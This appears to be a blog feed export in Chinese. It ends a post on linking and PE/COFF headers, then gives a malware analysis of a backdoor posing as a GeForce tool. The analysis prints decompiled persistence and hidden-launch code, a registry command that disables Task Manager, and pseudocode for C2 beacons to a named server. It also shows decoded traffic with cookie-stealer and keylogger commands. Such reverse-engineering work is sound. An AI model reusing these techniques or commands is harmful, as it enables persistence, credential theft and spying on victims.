‘main’:ptest.c:11:27: warning: format ‘%X’ expects argument of type ‘unsigned int’, but argument 2 has type ‘int (*)(pthread_t *, const pthread_attr_t *, void * (*)(void *), void *) {aka int (*)(long unsigned int *, const union pthread_attr_t *, void * (*)(void *), void *)}’ [-Wformat=]   printf(&quot;multi-thread\n,%X&quot;,pthread_create);                          ~^  ~~~~~~~~~~~~~~COLLECT_GCC_OPTIONS=&#39;-static&#39; &#39;-v&#39; &#39;-g&#39; &#39;-o&#39; &#39;pt&#39; &#39;-mtune=generic&#39; &#39;-march=x86-64&#39; as -v --64 -o /tmp/cc4JN3R6.o /tmp/cc2UYrxH.sGNU assembler version 2.30 (x86_64-linux-gnu) using BFD version (GNU Binutils for Ubuntu) 2.30COMPILER_PATH=/usr/lib/gcc/x86_64-linux-gnu/7/:/usr/lib/gcc/x86_64-linux-gnu/7/:/usr/lib/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/7/:/usr/lib/gcc/x86_64-linux-gnu/LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/7/:/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/7/../../../:/lib/:/usr/lib/COLLECT_GCC_OPTIONS=&#39;-static&#39; &#39;-v&#39; &#39;-g&#39; &#39;-o&#39; &#39;pt&#39; &#39;-mtune=generic&#39; &#39;-march=x86-64&#39; /usr/lib/gcc/x86_64-linux-gnu/7/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper -plugin-opt=-fresolution=/tmp/ccvnXkjw.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lc --build-id -m elf_x86_64 --hash-style=gnu --as-needed -static -z relro -o pt /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/7/crtbeginT.o -L/usr/lib/gcc/x86_64-linux-gnu/7 -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/7/../../.. /tmp/cc4JN3R6.o -lpthread --start-group -lgcc -lgcc_eh -lc --end-group /usr/lib/gcc/x86_64-linux-gnu/7/crtend.o /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crtn.oCOLLECT_GCC_OPTIONS=&#39;-static&#39; &#39;-v&#39; &#39;-g&#39; &#39;-o&#39; &#39;pt&#39; &#39;-mtune=generic&#39; &#39;-march=x86-64&#39;</code></pre><p>中间关键的程序有：C语言编译器cc1，Gun汇编器as，链接器collect2</p><h2 id="4-6链接过程控制"><a href="#4-6链接过程控制" class="headerlink" title="4.6链接过程控制"></a>4.6链接过程控制</h2><h3 id="最小HelloWorld"><a href="#最小HelloWorld" class="headerlink" title="最小HelloWorld"></a>最小HelloWorld</h3><p>专题：<a href="https://i1arn.github.io/2020/04/21/%E6%9C%80%E5%B0%8FHelloWorld%E5%B0%9D%E8%AF%95/">最小HelloWorld尝试</a></p><h1 id="5-WindowsPE-COFF"><a href="#5-WindowsPE-COFF" class="headerlink" title="5.WindowsPE/COFF"></a>5.WindowsPE/COFF</h1><p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener">PE Format</a></p><h2 id="5-1Windows的二进制文件格式PE-COFF"><a href="#5-1Windows的二进制文件格式PE-COFF" class="headerlink" title="5.1Windows的二进制文件格式PE/COFF"></a>5.1Windows的二进制文件格式PE/COFF</h2><p>与gcc不同，vc指定存放段使用的是<code>#pragma data_seg(&quot;SectionName&quot;)</code></p><h2 id="5-2PE的前身–COFF"><a href="#5-2PE的前身–COFF" class="headerlink" title="5.2PE的前身–COFF"></a><span id = "COFF">5.2PE的前身–COFF</span></h2><p>COFF文件属性主要通过<code>IMAGE_FILE_HEADER</code>来描述   </p><pre><code class="c++">typedef struct _IMAGE_FILE_HEADER {  WORD  Machine;                    //指定运行平台  WORD  NumberOfSections;           //Section数量，最大96  DWORD TimeDateStamp;              //文件的创建时间标示,此时间非文件系统显示的创建时间  DWORD PointerToSymbolTable;       //符号表地址  DWORD NumberOfSymbols;            //符号表的数量  WORD  SizeOfOptionalHeader;       //OptionalHeader的大小,只存在于PE可执行文件    WORD  Characteristics;            //文件属性} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</code></pre><p>映像头后面紧跟的是COFF文件的段表<code>IMAGE_SECTION_HEADER</code></p><pre><code class="c++">typedef struct _IMAGE_SECTION_HEADER {  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];      //  union {    DWORD PhysicalAddress;                  //文件地址    DWORD VirtualSize;                      //文件被加载之后的大小,即展开之后的大小,仅适用于可执行文件  } Misc;  DWORD VirtualAddress;                     //文件被加载之后的基地址  DWORD SizeOfRawData;                      //文件被存储时的大小,即未展开之前的大小,原始数据大小  DWORD PointerToRawData;                   //段在[文件]中的位置  DWORD PointerToRelocations;               //段的重定位表在文件中的位置  DWORD PointerToLinenumbers;               //段的行号表在文件中的位置  WORD  NumberOfRelocations;                //段中重定位的数量  WORD  NumberOfLinenumbers;                //段中的行号数量  DWORD Characteristics;                    //段的属性,主要包含段的类型,对其方式,访问权限等等} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</code></pre><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header" target="_blank" rel="noopener">IMAGE_FILE_HEADER structure</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header" target="_blank" rel="noopener">IMAGE_SECTION_HEADER structure</a></p><h2 id="5-3链接提示信息"><a href="#5-3链接提示信息" class="headerlink" title="5.3链接提示信息"></a>5.3链接提示信息</h2><p><code>.drectve</code>段,”directive”的缩写,内容是编译器传递给连接器的指令,即编译器希望告诉链接器该怎样链接这个目标文件,该段只是存在于目标文件中   </p><h2 id="5-4调试信息"><a href="#5-4调试信息" class="headerlink" title="5.4调试信息"></a>5.4调试信息</h2><p>所有以<code>.debug</code>开始的段,例如<code>.debug$F</code>,<code>.debug$P</code>等等,都包含这调试信息,这些段只存在于目标文件中.</p><h2 id="5-5大家都有符号表"><a href="#5-5大家都有符号表" class="headerlink" title="5.5大家都有符号表"></a>5.5大家都有符号表</h2><pre><code class="console">COFF SYMBOL TABLE000 01016FC6 ABS    notype       Static       | @comp.id001 00000000 SECT2  notype       External     | IHttpD_NULL_THUNK_DATA</code></pre><p>|符号表中的下标|符号大小|符号所在的位置|<a href="#符号类型">符号类型</a>|可见范围|符号名|</p><h2 id="5-6Windows下的ELF–PE"><a href="#5-6Windows下的ELF–PE" class="headerlink" title="5.6Windows下的ELF–PE"></a>5.6Windows下的ELF–PE</h2><div align=center><img src="./5/PE文件布局.png" alt="PE文件布局"   /></div>  PE是COFF的拓展,主要表现在两点不同:<ol><li>PE文件的开始<code>Dos MZ</code>可执行文件格式的文件头与代码桩</li><li>拓展<code>IMAGE_FILE_HEADER</code>成<code>IMAGE_NT_HEADERS</code> </li></ol><p><code>Dos Header</code>与<code>Dos Stub</code>主要是为了兼容早期的DOS系统而设计,DOS系统会根据在<code>IMAGE_DOS_HEADER</code>中的<code>e_cs</code>与<code>e_ip</code>来跳转到程序的入口地址,但是在PE文件中该地址将指向<code>DOS Stub</code>,在DOS系统中执行一段代码,打印”This program cannot be run in DOS mode”,然后退出。但是在该头在PE中并不是毫无用处,DOS头中<code>e_lfanew</code>保存着<code>IMAGE_NT_HEADER</code>在文件中的偏移量,如果该成员值为0,则启用DOS系统执行,否则为PE文件  </p><h3 id="IMAGE-NT-HEADER"><a href="#IMAGE-NT-HEADER" class="headerlink" title="IMAGE_NT_HEADER"></a>IMAGE_NT_HEADER</h3><pre><code class="C++">typedef struct _IMAGE_NT_HEADERS {  DWORD                   Signature;            //四个字节,表明是PE文件,固定位&quot;PE\0\0&quot;  IMAGE_FILE_HEADER       FileHeader;             IMAGE_OPTIONAL_HEADER32 OptionalHeader;} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</code></pre><p><a href="#COFF">IMAGE_FILE_HEADER参考前文</a></p><h3 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a><span id = "IMAGE_OPTIONAL_HEADER">IMAGE_OPTIONAL_HEADER</span></h3><pre><code class="C++">typedef struct _IMAGE_OPTIONAL_HEADER {  WORD                 Magic;                               //文件类型,可执行映像、ROM映像等等  BYTE                 MajorLinkerVersion;                  //链接器的主要版本  BYTE                 MinorLinkerVersion;                  //链接器的次要版本  DWORD                SizeOfCode;                          //代码段或此类段的数据大小总和  DWORD                SizeOfInitializedData;               //初始化数据段或此类段的大小总和  DWORD                SizeOfUninitializedData;             //未初始化  DWORD                AddressOfEntryPoint;                 //程序的入口地址,即第一条指令地址     DWORD                BaseOfCode;                          //代码段开头偏移量RVA  DWORD                BaseOfData;                          //数据段开头偏移量RVA  DWORD                ImageBase;                           //文件的优先装载地址  DWORD                SectionAlignment;                    //内存中段对齐粒度,一般是系统页面大小,常见4K  DWORD                FileAlignment;                       //文件中段对齐粒度,必须是2的倍数,默认512字节  WORD                 MajorOperatingSystemVersion;         //需要的系统主版本号      WORD                 MinorOperatingSystemVersion;         //次版本  WORD                 MajorImageVersion;  WORD                 MinorImageVersion;  WORD                 MajorSubsystemVersion;               //子系统主版本号  WORD                 MinorSubsystemVersion;  DWORD                Win32VersionValue;                   //保留  DWORD                SizeOfImage;                         //整个文件的大小,必须是内存对齐粒度的倍数...是指文件在内存中展开之后得到的内存大小,并非文件大小  DWORD                SizeOfHeaders;                       //所有文件头,包含magic魔数 ,或者说 文件大小减去所有section的大小  DWORD                CheckSum;                            //文件校验和  WORD                 Subsystem;                           //需要的子系统,GUI、CUI等等  WORD                 DllCharacteristics;                  //DLL文件属性  DWORD                SizeOfStackReserve;                  //Stack保留大小,依赖于SizeOfStackCommit而存在  DWORD                SizeOfStackCommit;                   //Stack需要的大小  DWORD                SizeOfHeapReserve;                     DWORD                SizeOfHeapCommit;  DWORD                LoaderFlags;                         //淘汰!  DWORD                NumberOfRvaAndSizes;                 //指明DataDirectory的数目  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];      //数据目录,保存着导入表,资源表,重定位表等等地址与长度} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</code></pre><p>参考<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32" target="_blank" rel="noopener">IMAGE_OPTIONAL_HEADER</a></p><h3 id="IMAGE-DATA-DIRECTORY"><a href="#IMAGE-DATA-DIRECTORY" class="headerlink" title="IMAGE_DATA_DIRECTORY"></a><a href="#IMAGE_DATA_DIRECTORY">IMAGE_DATA_DIRECTORY</a></h3><p><code>IMAGE_DATA_DIRECTORY</code>的定义比较简单,各个数据保存的顺序进行了明确的说明,具体参考<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory" target="_blank" rel="noopener">IMAGE_DATA_DIRECTORY</a></p><pre><code class="C++">typedef struct _IMAGE_DATA_DIRECTORY {  DWORD VirtualAddress;  DWORD Size;} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
          <category> 程序员的自我修养 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> 编译、链接 </tag>
            
            <tag> PE\ELF\COFF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析(1)</title>
      <link href="/2020/04/14/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1/"/>
      <url>/2020/04/14/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1/</url>
      
        <content type="html"><![CDATA[<p><a href="./GeforceExpirience.bin.zip">后门程序,解压密码：infected</a></p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><a href="https://app.any.run/tasks/af63aed4-dfc0-4312-9d69-ae7502a2cb3b/" target="_blank" rel="noopener">app.any.run</a><br>程序来源于在线沙箱runany，在沙箱对程序进行了简单的运行，最直观的反应是不断的在打开cmd窗口。</p><div align=center><img src="./运行流程.png" alt="运行流程"   /></div>`Geforce Expirience.exe`图标与显卡程序驱动相似。PEID显示存在upx压缩壳,而DetectItEasily分析过后个人怀疑是个自解压运行程序，于是后缀改成rar得到了一些其他程序。在解压缩软件打开之后确认了该文件为自解压程序。  <div align=center><img src="./自解压程序.png" alt="自解压程序"   /></div>而dclib文件夹中的文件是一些库   <div align=center><img src="./dclib文件夹.png" alt="dclib文件夹"   /></div><p>所谓的<code>vmcheck32.dll</code>文件也并不是dll文件，其中保存了一些base64编码，解码之后看到了与anyrun中相同的域名。</p><h1 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h1><p>沙箱中的开始于<code>System.vbe</code>和<code>Starter.exe</code>，程序都使用了<code>.net reactor</code>加壳保护，我们尝试使用了<code>de4dot</code>进行脱壳。</p><h2 id="System-vbe"><a href="#System-vbe" class="headerlink" title="System.vbe"></a>System.vbe</h2><p>Google知vbe是vbs编码之后的代码，为的就是防止识别，于是尝试利用一些现有的脚本来直接解码<br><a href="./scriptDecode.vbs">vbe-decoder</a></p><div align=center><img src="./Systemvbe解码之后.png" alt="System.vbe解码之后"   /></div>很明显的看出，vbs脚本创建了一个快捷方式并运行了一个bat脚本与一个程序<h3 id="e6ee5674bb9446c78bbc5729af6e2c28-exe"><a href="#e6ee5674bb9446c78bbc5729af6e2c28-exe" class="headerlink" title="e6ee5674bb9446c78bbc5729af6e2c28.exe"></a>e6ee5674bb9446c78bbc5729af6e2c28.exe</h3><pre><code class="c#">using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(&quot;SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}&quot;)){    foreach (string item in from x in registryKey.GetSubKeyNames()        where Regex.IsMatch(x, &quot;[0-9]{4}&quot;)        select x)    {        using (RegistryKey registryKey2 = registryKey.OpenSubKey(item))        {            registryKey2.SetValue(&quot;&quot;, 8, RegistryValueKind.DWord);          }    }}//……</code></pre><p>根据<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-control-registry-tree" target="_blank" rel="noopener">microsoft的说法</a>class目录下对应的是各个设置类别的GUID，而其中存放着设备的相关配置。</p><h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>其中bat文件中有效指令只有<code>&quot;C:\system32\svchost.exe&quot; &amp; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f</code>，其中是执行svchost程序，然后添加注册表</p><h4 id="svchost-exe"><a href="#svchost-exe" class="headerlink" title="svchost.exe"></a>svchost.exe</h4><p>这个程序运行使用在本地环境运行不起来，以为是反虚拟机调试，但是后来注意到是网络不通的问题。通过沙箱中的dns解析发现了‘ipinfo.io’、‘srv164667.hoster-test.ru’等在本地连接不成功，于是代理搬梯子准备分析调试。<br>所有程序、库都脱壳成功了，但是就是它失败。硬着头皮使用<code>dnSpy</code>进行调试。发现了些许内容  </p><pre><code class="python">#伪代码BaseUrl=&quot;http://srv164667.hoster-test.ru/t7rsexe3q8gjyon4o9o2p6iuzs1nv8ll5jys37mvg3nftujfj7p80zdfgwa/h0sezt8ofjrez/&quot;TestUrl=BaseUrl+&quot;srxaikiy9svo9bip1tqpu5rem3lln9zw8vgjsk7ldnc13bk2&quot;TargetUrl=BaseUrl+md5(TestUrl)+&quot;.php&quot;connect(TargetUrl+&quot;?&quot;+md5(&quot;srv164667.hoster-test.ru&quot;+&quot;password&quot;)+&quot;=c&quot;)#返回{&quot;status&quot;:&quot;UP&quot;}，猜测用来检查服务器状态token=connect(TargetUrl+&quot;?&quot;+&quot;some unknown args&quot;)#之后的所有网络交互都有参数“11b7d19ccf1147a7a18c5d8cb8fb6bc4 = reverse(base64(token))”</code></pre><p>在了解了参数内容为base64编码之后，手动解析了几个参数，发现了上传系统进程等等一些内容，同时在请求的结果中也发现了base64编码之后的一些命令。</p><div align=center><img src="./逆序base64解码.png" alt="逆序base64解码"   /></div><p>几天之后再尝试去分析时，发现原本的服务器已经挂了，无奈为了继续分析程序，手动搭建了一个简单的web服务。好在请求返回的结果基本上不多，在host文件中将恶意网址指向本地（使用AtapeDNS后导致恶意程序的其他网络请求失败）。<br>程序中运行这多个线程，采用不断冻结线程的方法一个一个去观察，同时呢为了使命令执行的效果更加方便且不产生更多的线程，返回中的command命令选用了forkbomb。经过多日努力跟踪分析，终于有了进展。。。  </p><div align=center><img src="./程序运行的多个线程.png" alt="程序运行的多个线程"   /></div><div align=center><img src="./FrokBomb命令执行.png" alt="FrokBomb命令执行"   /></div>通过断点Base64解码与正则匹配，逐个分析了线程之后找到了命令执行的关键线程  <div align=center><img src="./命令匹配.png" alt="命令匹配"   /></div>找到了命令匹配的地方，很快就有了命令的执行的过程了，首先是将命令按照一定的计算方法转换为整数  <div align=center><img src="./命令转换.png" alt="命令转换"   /></div>紧接着，根据转换结果来选择执行代码  <div align=center><img src="./根据命令转换结果执行.png" alt="根据命令转换结果执行"   /></div><p>分析过程中发现，请求的返回结果解码之后至少包含三种数据格式，至于已经发现的另外两种就没精力研究是啥作用了。。。</p><h5 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h5><p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System</code>的操作是将任务管理器禁用了，其中<code>HKCU</code>就是<code>HKEY_CURRNET_USER</code><br>补充一条相关路径： <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system</code></p><h2 id="Starter-exe"><a href="#Starter-exe" class="headerlink" title="Starter.exe"></a>Starter.exe</h2><pre><code class="c#">Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);  //获取用户的应用数据目录，此处为“C:\Users\i1arn\AppData\Roaming”//……//复制程序到了相关文件夹中//……string executablePath = Application.ExecutablePath;RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;);registryKey.SetValue(&quot;Adobe QuikInstall&quot;, folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //设置自启程序registryKey.Close();Thread.Sleep(10000);File.Copy(currentDirectory + &quot;\\System.vbe&quot;, folderPath + &quot;\\NotePad\\System.vbe&quot;);Process.Start(folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //启动`Adobe QuikInstall.exe`</code></pre><h3 id="Adobe-QuikInstall-exe"><a href="#Adobe-QuikInstall-exe" class="headerlink" title="Adobe QuikInstall.exe"></a>Adobe QuikInstall.exe</h3><p>看名字像是Adobe安装软件，其实……</p><pre><code class="C#">process.StartInfo.FileName = &quot;cmd.exe&quot;;process.StartInfo.Arguments = &quot;/C &quot; + folderPath + &quot;\\Obsidium\\Runtime Broker.exe&quot;;    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;process.Start();//……//顺序启动了“Runtime Broker.exe”、“SecurityHealthService.exe”、“YourPhone.exe”</code></pre><p>正常系统中：  </p><ol><li><code>Runtime Broker.exe</code>用来进行开始屏幕磁贴与桌面的后台交互  </li><li><code>SecurityHealthService.exe</code>由微软提供的安全服务</li><li><code>YourPhone.exe</code>微软在Windows10上发布的新应用，便于用户访问手机上的内容<br>三个程序在此处都是重复不断的创建<code>C:/Media</code>目录并启动<code>C:/Media/fontreview.exe</code>程序。</li></ol><h3 id="fontreview-exe"><a href="#fontreview-exe" class="headerlink" title="fontreview.exe"></a>fontreview.exe</h3><p>多种环境多次运行之后都未能发现该文件</p><h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><p>通过Python脚本获取到了请求中的URL参数并对其进行了解析。</p><pre><code class="Python">import scapyimport scapy_http.httpimport re，json，base64，collectionsfrom urllib import parseargs=collections.defaultdict(list)packets=scapy.rdpcap(&quot;./af63aed4-dfc0-4312-9d69-ae7502a2cb3b.pcap&quot;)for i in packets:    try:        data=re.split(&quot;[?&amp;]&quot;,i.getlayer(&quot;HTTPRequest&quot;).Path.decode())        for arg in data[1:]:            argname,argval=arg.split(&quot;=&quot;)            argval=base64.b64decode(parse.unquote(argval)[::-1]).decode()            if argval not in args[argname]:                args[argname].append(argval)  #旨在去除重复参数值。无法使用set，否则格式化打印时出错    except Exception as e:        passargs=json.dumps(args,indent=1)print(args)</code></pre><p>从结果中直观的看见实际上参数就几个，能够直接看出相关意义的不多。</p><pre><code class="bash">{ &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [  &quot;09ee87aef1bcd074085f36668392f85e262716383&quot; ], &quot;248854911a064ebaa582d1a56b380dcf&quot;: [  &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot; ], &quot;56367c166cecf6b4c653b02521db5738&quot;: [  &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,  &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,  &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot;&quot;,  &quot;done&quot;,  &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,  &quot;N/A&quot;,  &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,  &quot;4.7.2&quot;,  &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,  &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,  &quot; &quot; ], &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot; ], &quot;fb668fe31be77ee0a010de83c225c204&quot;: [  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,  &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,  &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,  &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,  &quot;957acf4c4fcce89f764055acf9978456&quot;,  &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,  &quot;c72a0133882ce6233c90990b8e00775c&quot;,  &quot;5d94deb0da6c64342915be998ce7d95f&quot;,  &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,  &quot;df4a7df5bb1d10900476bed933716663&quot;,  &quot;27ef1b29586798bc372642cf969b2187&quot;,  &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,  &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,  &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,  &quot;b785a88a74f90c8913744c7ba92d0be5&quot; ], &quot;0e1f102a661f322dc855ed186f235900&quot;: [  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot; ], &quot;156fde0665d178eece714785060d9d42&quot;: [  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot; ]}{   &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [      &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;   ],   &quot;248854911a064ebaa582d1a56b380dcf&quot;: [      &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;   ],   &quot;56367c166cecf6b4c653b02521db5738&quot;: [      &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,      &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,      &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot;&quot;,      &quot;done&quot;,      &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,      &quot;N/A&quot;,      &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,      &quot;4.7.2&quot;,      &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,      &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,      &quot; &quot;   ],   &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;   ],   &quot;fb668fe31be77ee0a010de83c225c204&quot;: [      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,      &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,      &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,      &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,      &quot;957acf4c4fcce89f764055acf9978456&quot;,      &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,      &quot;c72a0133882ce6233c90990b8e00775c&quot;,      &quot;5d94deb0da6c64342915be998ce7d95f&quot;,      &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,      &quot;df4a7df5bb1d10900476bed933716663&quot;,      &quot;27ef1b29586798bc372642cf969b2187&quot;,      &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,      &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,      &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;   ],   &quot;0e1f102a661f322dc855ed186f235900&quot;: [      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;   ],   &quot;156fde0665d178eece714785060d9d42&quot;: [      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;   ]}</code></pre><p>其他参数名都是通过’srv164667.hoster-test.ru’拼接’token_uid’、’filename’等等之后md5或者sha1计算的结果。</p><h1 id="说在最后"><a href="#说在最后" class="headerlink" 